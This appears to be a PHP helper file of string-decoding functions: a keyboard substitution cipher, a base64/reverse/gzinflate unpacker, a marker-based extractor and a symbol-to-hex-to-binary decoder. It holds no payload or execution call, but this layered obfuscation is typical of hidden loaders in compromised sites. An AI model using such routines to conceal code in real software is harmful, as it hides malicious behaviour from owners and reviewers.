<?php

function ETE( $string ){	return strtr( $string, "qwertyuiop[]asdfghjkl;'zxcvbnm,.QWERTYUIOP{}ASDFGHJKL:\"ZXCVBNM<>`~~`><MNBVCXZ\":LKJHGFDSA}{POIUYTREWQ.,mnbvcxz';lkjhgfdsa][poiuytrewq", "~`><MNBVCXZ\":LKJHGFDSA}{POIUYTREWQ.,mnbvcxz';lkjhgfdsa][poiuytrewqqwertyuiop[]asdfghjkl;'zxcvbnm,.QWERTYUIOP{}ASDFGHJKL:\"ZXCVBNM<>`~" );	}

function dbs( $text ){	return gzinflate( strrev( base64_decode( ETE( $text ) ) ) );	}

function deTextDS_Cipher( $param, $resource ){
    $n2 = stripos( $resource, "*%*", stripos( $resource, 'b$' . $param ) ) + 2;
    return substr( $resource, $n2 + 1, stripos( $resource, 'e$' . $param, $n2 ) - $n2 - 1 );
}

function X_CACHE($code){
	$arr = "abcdef1234567890";
	$n = str_split($arr);
	$code = trim($code);
	$h = array('!','@','$',';','~',':','?','*','(',')','-','=','_','+','<','.');
	$code = strrev(str_ireplace($h,$n,$code));
	for($i=strlen($code);$i>=0;$i--)
		$text .= $code[$i];

	$exp = explode("%",$text);
	for($i=0;$i<=count($exp);$i++){
		$temp = $exp[$i];
		$decode .= base_convert($temp,16,2)."%";
	}
	
	$exp = explode("%",$decode);
	for($i=0;$i<=count($exp);$i++){
		$X = base_convert($exp[$i],2,10);
		$_X .= chr($X);
	}
	
	return $_X;
}

?>